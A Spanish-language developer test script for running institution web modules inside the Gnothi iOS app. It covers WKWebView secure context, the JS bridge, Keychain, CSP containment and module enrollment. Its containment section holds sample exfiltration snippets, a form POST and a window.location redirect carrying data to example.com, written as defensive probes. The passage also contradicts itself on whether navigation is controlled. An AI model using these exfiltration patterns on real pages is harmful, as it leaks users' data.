# Probar los módulos web hospedados en iOS

**Qué prueba esto:** que la app que una institución publicó para el navegador —la misma, sin
recompilar— corre **dentro de Gnothi en un iPhone**, escribe su journal en los archivos del
Host, y que llega ahí como llega de verdad: alguien toca un botón en la página de la
institución.

Es el gemelo de [`../Gnothi.Mobile/PRUEBAS-WEBVIEW.md`](../Gnothi.Mobile/PRUEBAS-WEBVIEW.md),
que **ya está corrido y en verde en Android**. Conviene tenerlo al lado: donde este guion dice
«tiene que verse», la referencia son sus capturas.

> **NADA DE ESTO ESTÁ MEDIDO.** El código compila —incluida la superficie de `WKWebView`,
> `WKURLSchemeHandler` y Keychain, o sea que los nombres de API no son suposición— pero **no
> corrió nunca en un aparato ni en un simulador**. Este guion existe para convertir eso en
> mediciones. Si algo sale distinto, el guion está mal, no vos.

---

## 0 · Lo único que tenés que tener

- **Una Mac con Xcode** y el workload de .NET para iOS.
- Un **simulador de iOS 18+** o un iPhone conectado. Para P2 y P7 conviene aparato de verdad:
  el simulador miente sobre memoria.
- El escenario de la institución levantado **en la misma Mac**, con el script de acá:

```bash
./Gnothi.iOS/scenario-ios.sh
```

Levanta los ocho servidores (un publicador y una institución por módulo), no verifica hasta
que los ocho contestan `/salud`, y te dice cuál falló y en qué log si alguno no sube. Para
bajarlo, `./Gnothi.iOS/scenario-ios.sh --stop`.

**No hace falta ningún túnel**, y esa es la diferencia con Android: el simulador comparte el
stack de red de la Mac, así que `127.0.0.1` adentro **es** el localhost de la Mac. En Android
esto pide `adb reverse` y era la causa más común de «el módulo abre vacío y nada dice por qué».

Necesita PowerShell (`brew install --cask powershell`) porque **el catálogo de los módulos no
está duplicado**: el script llama a `Gnothi.Mobile/armar-bundle.ps1`, que es donde viven los
~200 renglones de qué publica cada institución. Si no querés instalarlo, copiá `bundles/` desde
la máquina Windows y pasale `--no-bundles`.

**Si la Mac es otra máquina** que el escenario, hay que apuntar los puertos a su IP de LAN, y
**eso cambia P6**: `network_security_config` no existe en iOS, pero App Transport Security sí,
y la excepción de loopback que está en `Info.plist` no cubre una IP de LAN. Hace falta además
`NSAllowsLocalNetworking`.

- **Un módulo instalado**, porque P0 a P5 y P7 lo necesitan. Hay **dos caminos** y los dos
  sirven; elegí según qué quieras probar primero.

  **a) El alta, con el esquema propio.** Es el camino real y además prueba P6:

  ```bash
  xcrun simctl openurl booted "gnothi://alta?bundle=http://127.0.0.1:8096/examenes.gmod"
  ```

  El universal link `https://go.gnothi.app/…` **no** funciona hoy —el dominio no existe, y sin
  AASA iOS no le pasa el enlace a la app—, así que el esquema propio es lo que hay. Está
  explicado en P6.

  **b) El paquete, si querés separar el alta del resto.** Pedile a Edgar `paquete.zip`: trae
  los cuatro módulos hospedados ya instalados, armados por el instalador de verdad (se dieron
  de alta en un emulador Android y se sacó lo que quedó). Descomprimilo en la carpeta de
  Gnothi en la app **Archivos**, de modo que quede `Documents/incoming/Modulos/<módulo>/`.

  **No trae datos de nadie**, y se verificó archivo por archivo: sin journals, sin `meta.bin`,
  sin credenciales. El journal lo llena el cartero en la primera apertura, y la credencial vive
  en el Keychain, así que iOS pide un permiso nuevo — que es la política. Las rutas de adentro
  son de Android y **está bien**: el Host de iOS las reescribe al copiar, porque su contenedor
  lleva un GUID que cambia en cada instalación.

  Esto último es lo que Android no puede dar: allá el paquete se empuja por `adb` porque no hay
  otra forma, y eso siempre fue una muleta de laboratorio.

```bash
dotnet build Gnothi.iOS/Gnothi.iOS.csproj -c Debug
```

**El log se mira así** (es el equivalente de `adb logcat`, y también son varias etiquetas):

```bash
log stream --predicate 'processImagePath CONTAINS "Gnothi"' --style compact
```

Todo lo que el Host escribe sale con el prefijo `GNOTHI:`, y la consola de cada módulo con
`modulo:<nombre>:`.

**Capturas**, el equivalente de `screencap` + `pull`:

```bash
xcrun simctl io booted screenshot captura.png
```

---

## P0 · ¿El origen del scheme handler es CONTEXTO SEGURO?

**Corré esta primero y no sigas si falla.** Es media hora y decide la forma de todo lo demás.

WebKit no deja manejar `http` ni `https` —`SetUrlSchemeHandler` tira para esquemas
reservados— así que el módulo se sirve en `gnothi-mod://<módulo>/`. **Si ese origen no es
contexto seguro, el módulo no arranca**: se caen el almacenamiento del origen y
`crypto.subtle`. No es teoría: es exactamente lo que mordió a Android cuando su primera versión
usaba `gnothi-mod://` allá, y por eso hoy Android usa un host virtual sobre https.

**Ya no lo tenés que medir a mano: la app se lo pregunta a sí misma.** El shim que Gnothi
inyecta manda un `probe` **antes de que corra una sola línea del bundle**, así que la respuesta
está en el log incluso si el módulo no arranca — que es justo el caso en que la ibas a
necesitar. Abrí cualquier módulo y buscá este renglón:

```bash
log stream --predicate 'processImagePath CONTAINS "Gnothi"' --style compact | grep 'P0'
```

```
GNOTHI: examenes: P0 · secureContext=true crypto.subtle=true storage=true origin=gnothi-mod://examenes
```

| resultado | qué significa |
|---|---|
| **los tres `true`** | seguimos. El resto del guion vale tal cual |
| **alguno `false`** | **el diseño cambia.** Hay que servir el bundle desde `127.0.0.1` con un servidor local en proceso, y eso trae puerto, ciclo de vida, y que ya no se intercepta «antes de la red» |
| **no aparece el renglón** | el shim no llegó a correr. Eso NO es un `false`: es otra falla, y P1 te va a decir cuál |

Si querés confirmarlo por otro lado, el inspector de Safari (Develop → Simulator → el WebView)
responde lo mismo con `window.isSecureContext`, `!!window.crypto.subtle` y
`!!navigator.storage`. Sirve como segunda opinión, no como la medición.

**Está aislado a propósito.** Lo único que cambiaría es `OriginFor` en
[`IosWebModule.cs`](IosWebModule.cs) y quién sirve. La arquitectura —la CSP, el journal, el
cursor, el puente— no se toca, porque vive en `Gnothi.MobileShared` y no sabe de esto.

---

## P1 · El módulo arranca hospedado

Con un módulo ya instalado, tocá su tarjeta y después **«Abrir…»**.

**Qué tenés que ver:** la UI de la institución a pantalla completa, sin barra de direcciones, y
el aviso que solo aparece hospedado: *«Se está guardando en este teléfono. Tu ⟨expediente /
registro / bitácora⟩ es tuyo y está acá: Gnothi le dio a esta institución una carpeta en tu
teléfono…»* —cada institución le pone su palabra—. Los números tienen que ser los mismos que
muestra su app suelta.

> **Y ACÁ iOS SE VE DISTINTO DE ANDROID A PROPÓSITO — no es un bug.** Arriba del módulo va una
> franja delgada de Gnothi que dice *«<nombre de la institución> · adentro de Gnothi»* con un
> **Listo** a la derecha. Android no la necesita porque tiene el botón atrás del sistema; iOS no
> tiene equivalente —el gesto de borde lo consume el contenido del módulo— así que la vuelta hay
> que darla, y de paso la franja dice de quién es la app en la que estás parado en vez de dejarlo
> como pista visual. Se probó primero un botón flotante y le tapaba el logo de «Supermercado La
> Guaria»; el módulo arranca debajo de la franja para que eso sea imposible por construcción.
> Decisión de Geaninna, y el alto está en `FranjaAlto` para que lo pueda ajustar.
>
> **[MEDIDO 2026-09-07]** simulador iPhone 17 Pro / iOS 26.5, con los cuatro módulos del paquete.
> En el log: `GNOTHI: abrir: '<módulo>' en pantalla` al abrir, y
> `GNOTHI: cerrar: '<módulo>' fuera de pantalla` al tocar Listo. Cerrar **no** mata el módulo:
> sigue vivo contestándole al asistente, y volver a abrirlo es instantáneo.

**En el log:**

```
GNOTHI: examenes: the bundle declares its base at /app/
```

**Mal:** pantalla en blanco ⇒ casi siempre el `base href`, igual que en Android. El bundle se
publica con `<base href="/app/">` y Gnothi lo lee del `index.html` para componer la URL. Si no
coincide, todo da 404 y no hay ningún error.

**Y una que es solo de acá:** si la pantalla queda en blanco **y P0 dio `false`**, no busques el
`base href` — es el contexto seguro.

---

## P2 · Cuánto pesa un módulo en WKWebView

**Es la medición que puede volver bloqueante un hueco que hoy está anotado.**

Cada módulo trae **su propio motor**: 20 MB de `_framework` con `Puppeteer.wasm`,
`Choreography.wasm` y el runtime de .NET. En Android eso da **216–248 MB de PSS** con un módulo
abierto.

En iOS hay dos razones para que pueda ser peor **y una para que sea mejor**, y por eso hay que
medirlo y no suponerlo:

- el presupuesto antes del jetsam es más duro y menos negociable
- pero `WKWebView` corre el contenido en **procesos separados**, así que el costo puede contarse
  distinto

Medí con Instruments (Allocations + Memory) o el gauge de Xcode, **con un módulo abierto** y
después **con los cuatro instalados y uno vivo**.

| lo que dio Android | lo que da iOS |
|---|---|
| 216–248 MB, aparato | |
| 157–160 MB, emulador | |
| 199 MB, cuatro instalados y uno vivo | |

**Si un solo módulo no entra cómodo**, la conversación sobre el sustrato compartido deja de ser
un hueco anotado y pasa a ser urgente.

---

## P3 · El puente, en las dos direcciones

Pasa sola al abrir el módulo, pero conviene mirarla porque **es lo que más difiere de Android**.

En Android el módulo llama a un objeto inyectado con `@JavascriptInterface`. Acá no existe eso:
un `WKUserScript` define `window.gnothiPuente` con **los mismos seis verbos** antes de que corra
una línea del bundle, y cada uno hace `postMessage`. El módulo no puede notar la diferencia — y
si la nota, es un bug.

En el inspector de Safari, con el módulo abierto:

```javascript
typeof window.gnothiPuente.listo      // "function"
typeof window.gnothiPuente.pull       // "function"
Object.keys(window.gnothiPuente)      // los seis: listo, contesta, listar, leer, escribir, pull
```

**Qué prueba:** que el shim se inyectó y con la forma correcta. Si falta uno, el módulo se
cuelga esperando una respuesta que nunca llega, y el síntoma es un timeout a los 30 segundos.

**En el log, cuando Gnothi le pregunta algo:** tiene que aparecer la respuesta del módulo, no un
timeout.

---

## P4 · El journal en el contenedor, y la credencial en Keychain

```bash
xcrun simctl get_app_container booted com.ncubo.gnothi.host data
```

Y adentro, `Library/Application Support/journals/<módulo>/<actor>/journal/journal_000001.bin`.

**Qué tenés que ver:** el nombre va dos veces —la carpeta del módulo y adentro la del actor— y
**la segunda no siempre se llama igual que la primera**: DealershipCar nombra su actor por el
VIN.

Que ahí no hay credencial —**tiene que dar 0**—:

```bash
grep -c -e at_ -e rt_ -e device- <ruta>/journal_000001.bin
```

Control de que la búsqueda vale —**más de 0**—:

```bash
grep -c -e bitacora <ruta>/journal_000001.bin
```

**Y la parte que es solo de iOS:** la credencial vive en el **Keychain** con
`WhenUnlockedThisDeviceOnly`, no en un archivo cifrado como en Android. Dos cosas que hay que
ver la primera vez, y las dos están anotadas como no medidas en
[`IosSecretStore.cs`](IosSecretStore.cs):

1. que `Get` justo después de `Save` devuelva lo mismo
2. **que después de reinstalar la app NO devuelva nada.** El Keychain **sobrevive a la
   desinstalación** en algunas versiones de iOS. Si eso pasa, Gnothi se presentaría ante el
   publicador con la credencial de una instalación anterior — y habría que borrarla al
   instalar.

---

## P5 · Contención: el módulo no puede salir a la red

La CSP es **literalmente la misma cadena** que en Android, calculada por el mismo código
(`Gnothi.MobileShared/BundleServer.cs`), con el hash de cada script en línea computado al servir. Lo
que cambia es quién la pone: acá va en la respuesta del scheme handler.

**La mitad se ejecuta sola, y es lo primero que tenés que mirar.** El PWA de Blazor intenta
registrar su service worker en cada carga y la política se lo deniega sin que nadie toque nada.
Medido en Android el 2026-09-07 apenas instalar `examenes`:

```
examenes: Creating a worker from '.../app/service-worker.js' violates the following
Content Security Policy directive: "worker-src 'none'". The action has been blocked.
```

**[NO MEDIDO EN iOS]** Acá tiene que pasar lo mismo, porque es la misma cadena calculada por el
mismo código, y sería la confirmación más barata de que la CSP llega al módulo por el scheme
handler. Si **no** aparece, la CSP no está llegando —y eso lo tenés que resolver antes de seguir
con el resto de P5—. La denegación es benigna: en Android, en la misma corrida, `resumen`
contestó igual, así que el módulo funciona sin su service worker.

**Lo que sí pide una sonda** es la otra mitad: que no pueda alcanzar al *publicador*. Eso es
`connect-src 'self'`, y ahí el módulo hospedado nunca lo intenta —usa el puente—, así que no hay
nada que negar. Hay que agregarle una sonda temporal que haga `fetch` contra el publicador.
Cuando está puesta, la violación aparece en la consola del módulo —que acá llega por el mismo
canal del puente, porque iOS no tiene `WebChromeClient`—:

```
modulo:examenes: error: Refused to connect to 'http://127.0.0.1:8095/...' because it
violates the following Content Security Policy directive: "connect-src 'self'"
```

### La denegación ya no es muda: Gnothi la cuenta

Desde el **2026-09-07** cada rechazo del motor le llega a Gnothi **como un hecho**. El vigía vive
en `Gnothi.MobileShared/BundleServer.cs` y se inyecta en el documento que Gnothi sirve, así que **iOS y
Android lo tienen del mismo código** — no hay una versión de cada uno que se pueda desincronizar.

```
GNOTHI: examenes: REFUSED by worker-src -- gnothi-mod://examenes/app/service-worker.js
        (from gnothi-mod://examenes/app/:35); 1 so far
```

Trae la directiva, qué se bloqueó, de dónde salió y **la cuenta**. Esa cuenta distingue una
política declarada de una que se sabe que está aplicando.

> **⚠️ CORRECCIÓN 2026-09-07 · noche.** Acá decía *«abrí cualquier módulo y tiene que aparecer al
> menos el `worker-src`; si no sale ninguno, el vigía no está corriendo»*. **Ese criterio da un
> falso negativo en iOS, y Renán lo encontró corriéndolo.** Queda escrito porque el motivo
> enseña más que la regla.
>
> Allá la denegación llegó como **`script-src-elem`**, un paso antes: el script de registro fue
> bloqueado, así que nunca llegó a pedir el worker. Y su hipótesis para los otros tres módulos
> —**[RAZONADO]**, se confirma con un renglón en el inspector— es que sobre un esquema propio
> WebKit **no expone `navigator.serviceWorker`**, así que `register()` ni se llama y no hay nada
> que denegar. No sería contención más débil: sería que la superficie no existe.
>
> **Y desde el arreglo del hash CRLF, ni siquiera es estable en Android.** El script ahora corre,
> así que la directiva pasó de `script-src-elem` a `worker-src` — **[MEDIDO 2026-09-07]** en el
> emulador. O sea que la denegación del service worker **depende de la plataforma, del formato
> del bundle y de si el hash coincide**. Es un mal testigo.

**Qué mirar acá, entonces.** Abrí un módulo y fijate si aparece **alguna** línea `REFUSED`, sin
esperar una directiva concreta:

- **si aparece alguna** → el vigía corre y la CSP está llegando. Seguí.
- **si no aparece ninguna** → **no concluyas que está roto todavía.** Puede ser legítimo, y en
  iOS es lo más probable. Confirmalo con el intento del formulario de acá abajo, que **sí es
  determinista en las dos plataformas**: si ése tampoco produce una línea, ahí sí el vigía no
  está corriendo o la CSP no está llegando por el scheme handler.

**El testigo bueno es el formulario, no el service worker.** El del service worker es gratis y
sirve de indicio; el del formulario lo provocás vos y tiene que dar siempre.

> No va al journal, a propósito: el journal es el registro de la persona tal como lo escribe la
> institución, y una violación de contención es de Gnothi.

### Las otras dos salidas, y ésta se corre entera

`connect-src` cubre el `fetch`, pero **no es la única forma de sacar datos de una página**. Hay
dos más, y las dos estaban abiertas hasta el **2026-09-07**:

| salida | qué la gobierna | ¿hereda de `default-src`? |
|---|---|---|
| **`<form action="https://ajeno" method="post">`** | `form-action` | **no** — por eso faltaba |
| **`window.location = 'https://ajeno/?d=…'`** | **ninguna directiva existe** | — |

La primera se cerró con `form-action 'self'` en la cadena compartida —o sea que Android e iOS la
tienen por el mismo código—; la segunda con `OnlyItsOwnOrigin`, un `WKNavigationDelegate` en
[`IosWebModule.cs`](IosWebModule.cs), que compara el **origen completo** y loguea el rechazo.

**Esta parte no necesita sonda.** En el inspector de Safari (Develop → Simulator → el WebView),
con el módulo abierto:

```javascript
// intento A · el formulario
var f = document.createElement('form');
f.method = 'POST'; f.action = 'https://example.com/collect';
document.body.appendChild(f); f.submit();

// intento B · la navegación
window.location = 'https://example.com/?d=lo-que-sea';
```

**Qué tenés que ver.** La página **no** se mueve de su propio origen, y en el log:

```
modulo:examenes: Sending form data to 'https://example.com/collect' violates the following
Content Security Policy directive: "form-action 'self'". The request has been blocked.
GNOTHI: examenes: navigation refused to https://example.com -- outside its own origin
```

Probá también `gnothi-mod://otro-modulo/`: también tiene que rebotar, porque la regla es el
origen completo —esquema **y** host—, no sólo el esquema. Un módulo no puede navegar al de otro.

> **MEDIDO el 2026-09-07 en Android, antes y después**, que es donde había emulador. Sin el
> arreglo los dos intentos **salían**: la página terminaba en `https://example.com/collect` y el
> servidor contestaba **405**, o sea que el POST llegó de verdad a la red; y la navegación
> terminaba en `https://example.com/?d=datos-de-sonia`. No era un agujero teórico.
>
> **[NO MEDIDO EN iOS].** `form-action` es la misma cadena del mismo código, así que debería dar
> igual. `OnlyItsOwnOrigin` es código propio de iOS y **nunca corrió en un aparato**: si algo de
> esta prueba falla, es el candidato.

**Y el inspector ahora funciona.** Desde iOS 16.4 un `WKWebView` sólo aparece en Develop si se
declara inspeccionable, y el valor por omisión es `false` — Safari lista **nada**, sin decir por
qué. Se puso `web.Inspectable = true` bajo `#if DEBUG`, y sólo ahí: un WebView inspeccionable
deja leer la memoria de la página a quien tenga un cable, y esa memoria tiene el journal.

---

## P6 · El alta desde el enlace de la institución

> ## ⛔ HOY ESTA NO SE PUEDE CORRER, y conviene saberlo antes de perder la tarde buscándole la vuelta.
>
> **`go.gnothi.app` no existe.** Medido el 2026-09-07: `nslookup` da *non-existent domain*.
> Y sin dominio no hay AASA, y sin AASA iOS no le entrega el enlace a la app: Safari abre la
> página. **Y acá no hay `pm set-app-links`**, que es el atajo con el que Android se saltea la
> verificación en el laboratorio — o sea que en Android esto *parece* funcionar sólo porque se
> fuerza la aprobación local.
>
> `?mode=developer` tampoco alcanza: hace que iOS pida el AASA **al dominio** en vez de a la CDN
> de Apple, y el dominio no resuelve.
>
> ### ✅ Hay un camino puesto para probarla igual: un esquema propio.
>
> `CFBundleURLTypes` en el `Info.plist` declara `gnothi:`, y `OpenUrl` en el `AppDelegate` lo
> manda **al mismo `HandleLink`** que atiende el universal link. No necesita dominio:
>
> ```bash
> xcrun simctl openurl booted "gnothi://alta?bundle=http://127.0.0.1:8096/examenes.gmod"
> ```
>
> Y en un aparato de verdad, pegando `gnothi://alta?bundle=…` en Safari.
>
> **Es el mismo código de acá para abajo**, así que todo lo que dice esta prueba sobre lo que
> tenés que ver en pantalla y en el log vale tal cual. Lo único que NO prueba es la
> verificación del enlace en sí —el AASA—, que es exactamente la parte que necesita el dominio.
>
> **Un parser y no dos**, a propósito: verificado en .NET 10 que `System.Uri` le da a un esquema
> propio el mismo `Query` que a `https`, o sea que `HandleLink` no necesitó ni un cambio.
>
> **Lo que hay que saber del esquema propio:** lo puede invocar cualquiera —cualquier app,
> cualquier página—, y a diferencia del universal link nada verifica quién es dueño de él. Lo
> que lo hace aceptable es que el alta **siempre** muestra la hoja de consentimiento antes de
> instalar: un enlace hostil llega hasta la hoja y no más, y la persona ahí lee quién sirve el
> bundle, qué va a poder contestar y dónde se va a guardar el registro —y que es de ella—.
> Queda anotado en el `Info.plist` que antes de publicar hay que decidir si se queda; si no, es
> un `#if DEBUG`.
>
> **La otra salida, que hay que tener igual para el producto:** el dominio sirviendo el AASA
> como dice acá abajo.
>
> **Y el primer módulo puede entrar por el paquete** en vez de por el alta, si preferís separar
> las dos cosas: ver §0. El resto del guion (P0 a P5, P7) no depende de nada de esto.

Es el gemelo del App Link, y **falla parecido**: allá, sin `AutoVerify` más un
`assetlinks.json` verificado, Chrome navega él mismo y muestra `DNS_PROBE_FINISHED_NXDOMAIN` —
el botón no hace nada y no hay pista. Acá el equivalente es el **AASA**, y el síntoma es que
Safari abre la página en vez de la app.

**Lo que hay que servir**, en `go.gnothi.app`:

```
/.well-known/apple-app-site-association
```

sin extensión, como `application/json`, por https, **sin redirecciones**, con el appID
`<TeamID>.com.ncubo.gnothi.host` y los paths `/alta*` y `/abrir*`.

> **La trampa que cuesta una tarde: iOS lo cachea.** Si la primera vez se sirve mal, no alcanza
> con arreglarlo — hay que **reinstalar la app** para que lo vuelva a pedir. Android tiene el
> atajo de `pm set-app-links` para probar sin dominio; **acá no hay equivalente por línea de
> comandos**.

Con eso puesto, tocá **«Agregar a Gnothi»** en la página de la institución.

**Qué tenés que ver EN LA PANTALLA**, que es lo que se puede juzgar sin leer un log:

1. ⟳ *Bajando el módulo de…* → *Revisando qué trae…*, con la lista todavía en «0 de 0»
2. la hoja con lo que la institución propone: qué va a poder contestar, dónde se va a guardar el
   registro *(«Es tuyo. Gnothi se lo administra a esta institución, no se lo lleva»)*, con quién
   va a hablar, y quién sirvió el bundle. **Todavía no hay nada instalado.**
3. **«Ahora no»** ⇒ no queda **nada**. Comprobalo: no tiene que existir `Modulos/` ni
   `journals/` en el contenedor, y el log dice `alta: '<módulo>' descartado por la persona`

**En el log:**

```
GNOTHI: alta: bajando el bundle de 127.0.0.1
GNOTHI: alta: propuesta de '<módulo>' servida por 127.0.0.1
GNOTHI: alta: '<módulo>' instalado en …
GNOTHI: alta: '<módulo>' quedo instalado; N modulos
```

**Probá los dos estados**, que en Android eran dos métodos distintos y acá entran los dos por
`ContinueUserActivity`: con **Gnothi cerrada** —iOS la lanza y después llama— y con **Gnothi ya
abierta**. Lo que cambia es si la cara ya existe, y el enlace que llega antes queda pendiente.

---

## P6b · El alta desde adentro de Gnothi: el enlace pegado, con la barra

> **Escrito el 2026-09-09 en Windows, sin Mac.** Todo lo de P6b a P6e corre en `Gnothi.MobileShared` y en
> `ui.html`, que iOS comparte tal cual con Android, más cuatro piezas propias de iOS escritas ese día
> sin compilar: los recursos de la marca en el csproj, la cámara (`NSCameraUsageDescription` y
> `RequestMediaCapturePermission` en el `Bridge`), el selector de documentos (`PickModuleFiles`) y
> «Copiar en Gnothi» (`CFBundleDocumentTypes`, `UTExportedTypeDeclarations`, `HandleFile`). Quien
> tenga la Mac compila primero; si algo no compila, casi seguro es una firma de binding, y el espejo
> de cada pieza está en `Gnothi.Mobile/MainActivity.cs`. En Android todo esto está medido
> (`Gnothi.Mobile/PRUEBAS-WEBVIEW.md` §2b); acá lo que se mide es que iOS haga lo mismo.
>
> **[MEDIDO 2026-09-09]** simulador iPhone 17 Pro / iOS 26.5. **Compiló sin tocar una línea**:
> ninguna firma de binding estaba mal. **P6b pasa los cinco pasos y P6d las dos puertas.** P6c no
> se puede acá —el simulador no tiene cámara— y P6e queda pendiente. El detalle, con los números y
> cuatro hallazgos que no son del alta, está en
> [`HALLAZGOS-CORRIENDO-EL-GUION.md`](HALLAZGOS-CORRIENDO-EL-GUION.md) §11. **Dos de esos
> hallazgos cambian este guion:** el paquete del §0 choca con los bundles de hoy si el mismo
> módulo entra por los dos caminos (§11.3), y la comprobación de P7 **no pasa en la primera
> alta** porque se rinde a los 60 s mientras el WASM tarda ~64 en arrancar en frío (§11.4).
>
> **Y la actualización de un módulo (nota 44, pasos 1 y 2, la misma noche)** tampoco tiene pieza propia de
> iOS: el plan vive en `Gnothi.Host/UpdatePlan.cs`, la revisión del origen al arrancar (`Shell.ReviewOrigins`)
> y la op `actualizar` en `Gnothi.MobileShared/Shell.cs`, y la hoja de «Actualizar» y la pastilla «Hay una versión
> nueva» en `ui.html`. Se prueban con los pasos 9 y 10 de la guía de Android, tal cual, con la página de la
> institución alcanzable desde el iPhone como en P6b.

**Qué prueba:** que un módulo entra sin universal link y sin `gnothi://`: la persona pega el enlace de
su institución en Gnothi, ve bajar el paquete y decide.

**Antes:** `./scenario-ios.sh` (ahora arma los bundles con `-Origen` y los **firma**, y las páginas
publican `keys`, `revoked` y `modules` en su `/.well-known/gnothi/modules.json`). En el simulador no
hace falta túnel: comparte la red de la Mac.

1. Abrí Gnothi. El inicio es el mosaico de marcas con el botón **«Agregar»** arriba a la derecha.
   Si la cara sale con la tipografía del sistema o el logo de Gnothi roto, faltan los
   `BundleResource` de `Assets/fonts` y `Assets/img` en el csproj: están puestos, pero es lo primero
   que hay que mirar.
2. «Agregar» abre *Tus instituciones, siempre contigo* con tres filas. Tocá **Pegar su enlace**, pegá
   `http://127.0.0.1:8096/examenes.gmod` y «Agregar».
3. **Qué tiene que verse:** la franja *Bajando el módulo de 127.0.0.1…* crece con una barra y los
   megabytes (*4,5 MB de 13,0 MB · 35 %*). En el simulador baja tan rápido que casi no se ve: la
   página acepta `--LentoKBps 700` para servir el bundle despacio (agregalo a mano al `dotnet run` de
   la página en `scenario-ios.sh`, o levantá esa página aparte). Después *Revisando qué trae…* y la hoja:
   el bloque de identidad (*Laboratorio Clínico Delfos S.A., 3-101-123456 · Declara delfos.cr y lo
   sirvió 127.0.0.1*, en ámbar porque el mock declara un dominio que no es el que lo sirve), la
   descripción, y «Lo que Gnothi revisó»: *Lo respalda 127.0.0.1, del enlace que pegaste*, *Firmado por
   la llave «examenes-…», que su origen publica. Gnothi la va a recordar*, los archivos y MB.
4. «Instalar en mi teléfono» → la tarjeta de Delfos con logo, banner y eslogan. En la consola:
   `GNOTHI: alta: respaldo de 127.0.0.1: Verified; firma: Published` y `alta: 'examenes' quedó instalado`.
   `installation.json` (en Documents, visible por Archivos) queda con `provenance` y `signer`.
5. Repetilo: *Ya tenés este módulo* y *Firmado con la misma llave que la vez pasada (desde …)*.

**Lo que se rechaza, sin hoja:** un enlace con `&h=` de otro manifiesto, un paquete con un archivo
tocado después de firmado, uno que dice ser de otro origen del que lo sirvió o que su origen ya no
lista, y uno firmado con una llave retirada. Las franjas son las mismas de Android (§2b paso 6 de su
guion).

## P6c · El alta desde el código, con la cámara

**Qué prueba:** que el lector de códigos de la página funciona en WKWebView: `getUserMedia` con la
cámara trasera, jsQR decodificando, y el enlace leído entrando por el mismo camino que el pegado.
**Sólo en un iPhone real**: el simulador no tiene cámara.

1. Con la página de una institución abierta en la Mac (su QR está debajo del botón «Agregar a
   Gnothi»), en Gnothi: «Agregar» → **Escanear su código**.
2. **La primera vez iOS pide permiso** con el texto de `NSCameraUsageDescription`. Si en vez del
   diálogo la hoja dice *Gnothi no tiene permiso para usar la cámara*, el `Bridge` no está contestando
   `RequestMediaCapturePermission`, o falta la clave en el plist. En la consola tiene que salir
   `GNOTHI: cámara: concedida a la página`.
3. Apuntá al código. Lee en un par de segundos y sigue solo: la barra, *Revisando qué trae…*, y la hoja
   con *del código que escaneaste* y *El paquete es el mismo que sellaba el enlace*.

**Si no lee:** el código de la página tiene que salir **entero** (se dibuja con `viewBox` desde el
2026-09-09; antes se recortaba y ningún teléfono lo leía). Y el lector pide la cámara a 720p; si el
`videoWidth` que imprime la consola del WebView es 640, la cámara dio menos y un código en un monitor a
un brazo de distancia no se resuelve.

## P6d · El alta desde un archivo: «Copiar en Gnothi» y el selector, con varios

**Qué prueba:** las dos puertas del archivo en iOS.

**«Copiar en Gnothi».** Mandale un `.gmod` al teléfono (AirDrop, correo, o dejándolo en la carpeta de
Gnothi por Archivos) y tocalo: en la hoja de compartir aparece **Gnothi**. Es `CFBundleDocumentTypes` con
nuestro tipo `app.gnothi.module` (extensión `.gmod`, mime `application/vnd.gnothi.module`, conforma a
zip) y con `public.zip-archive` en rango *Alternate*, porque un archivo que pasó por chat suele perder
el tipo. Llega a `AppDelegate.OpenUrl` como `file://` y de ahí a `HandleFile`, que lo lee bajo su
security scope y lo manda al alta. Consola: `alta: archivo 'examenes.gmod' (… bytes) por documento` →
`alta: archivo 'examenes.gmod': 127.0.0.1 dice Verified` → la hoja con *Llegó como el archivo
examenes.gmod, y 127.0.0.1 lo respalda: publica exactamente este paquete*.

En el simulador, sin AirDrop: `xcrun simctl openurl booted "file:///ruta/al/examenes.gmod"` no sirve
(no pasa por el sistema de documentos); arrastrá el archivo a la ventana del simulador, que lo deja en
Archivos, y desde ahí «Copiar en Gnothi».

**El selector, con varios.** «Agregar» → **Elegir archivos en mi teléfono** abre el
`UIDocumentPickerViewController` con nuestro tipo, zip y datos, y **selección múltiple** (`asCopy`,
así Gnothi recibe copias suyas y no necesita scope). Elegí dos módulos y un zip cualquiera → la hoja
**«Esto encontré en lo que elegiste»**: una fila por archivo, con la institución y su eslogan si es un
módulo, *ya lo tenés* o *instalado* según corresponda, y *no entra* con el porqué si no lo es. Tocá uno
→ su hoja → instalar → la lista vuelve con esa fila marcada. Consola: `alta: la persona eligió 3
archivos; 2 son módulos`. Si el botón dice *En este teléfono todavía no se puede elegir un archivo*, el
`Bridge` no está interceptando `altaArchivo`.

## P6e · La firma, el pin y la revocación

Idéntico a Android, porque es todo `Gnothi.MobileShared`: `Gnothi.Mobile/PRUEBAS-WEBVIEW.md` §P2d y §2b paso 7.
Lo que vale medir en iOS es que `installation.json` guarda `signer` y que la **marca de llave
retirada** aparece en la tarjeta al relanzar la app tras un `--revoke` del lado del publicador (la
comprobación corre al arrancar, en segundo plano, y repinta la pantalla sola).

## P7 · Las consultas del módulo llegan al Host

Pasa sola al dar de alta: Gnothi comprueba el módulo apenas lo instala.

**En el log:**

```
GNOTHI: comprobación de examenes: {"module":"examenes","matches":true,
        "declared":[…],"actual":[…]}
```

`matches:true` dice que lo que el manifiesto **declara** y lo que el módulo **contesta** son la
misma lista.

**Puede aparecer una vez** `{"ok":false,"motivo":"La app todavia no arranco."}` justo después del
alta, y después la respuesta buena: es la carrera conocida entre el dibujado y la hidratación
del actor. Si se queda ahí, entonces sí es un problema.

---

## Lo que este guion NO puede probar

No es que falte hacerlo: **no se puede desde acá**, y conviene que esté dicho para que nadie lo
dé por verificado.

- **El AASA de verdad** necesita el dominio `go.gnothi.app` sirviendo el archivo y el Team ID
  real. Sin eso, P6 solo se puede probar a medias.
- **Que el enlace sobreviva a pasar por la App Store.** iOS no tiene Install Referrer: si el
  enlace se pierde, la persona vuelve a la página de su institución y toca de nuevo. Es peor que
  en Android y es lo que hay.
- **El traspaso de aserciones** está implementado y compartido (`Handoff`), pero no hay pantalla
  que lo dispare en iOS todavía.
- **La contención (P5) sin sonda**, igual que en Android.
- **`WKNavigationDelegate.DecidePolicy`** no está puesto: la navegación de nivel superior no
  está controlada.
- **La cámara y el selector, hasta que alguien los corra en un iPhone.** P6c y P6d están escritos
  contra los bindings, sin Mac; en Android las mismas cosas están medidas. Lo que falta no es
  código, es la corrida.

---

## Deuda anotada, para que no parezca olvido

**Las cuatro piezas de iOS del 2026-09-09 no están compiladas.** `Gnothi.iOS.csproj` (los
`BundleResource` de `Assets/fonts` y `Assets/img`), `Info.plist` (`NSCameraUsageDescription`,
`CFBundleDocumentTypes`, `UTExportedTypeDeclarations`), `ViewController.cs` (`RequestMediaCapturePermission`
